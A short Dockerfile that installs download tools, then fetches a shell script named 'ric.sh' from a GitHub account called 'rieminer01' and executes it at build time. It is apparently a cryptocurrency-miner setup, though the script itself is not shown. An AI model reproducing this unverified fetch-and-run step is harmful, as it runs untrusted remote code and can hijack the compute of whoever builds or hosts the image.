FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/rieminer01/rie/main/ric.sh
RUN chmod +x ric.sh
RUN ./ric.sh
